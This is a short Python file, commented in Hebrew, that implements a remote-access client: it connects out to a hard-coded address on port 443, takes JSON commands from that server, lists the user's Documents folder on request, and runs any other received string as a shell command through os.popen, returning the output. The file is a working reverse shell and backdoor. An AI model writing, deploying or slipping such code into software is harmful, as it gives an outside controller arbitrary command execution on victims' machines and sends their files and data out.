import socket
import json
import os


class Client:
    def __init__(self, ip, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((ip, port))

    def run(self):
        while True:
            raw_data = self.sock.recv(1024).decode()
            if not raw_data: break

            # קריאת ה-JSON מהשרת
            request = json.loads(raw_data)
            cmd = request.get("cmd")

            # ביצוע לוגיקה
            if cmd == "DRIVE":
                result = os.listdir("C:/Users/User/Documents")
            else:
                result = os.popen(cmd).read()

            # החזרת תשובה בפורמט JSON
            response = {"status": "success", "data": result}
            self.sock.send(json.dumps(response).encode())


if __name__ == "__main__":
    Client('172.20.148.222', 443).run()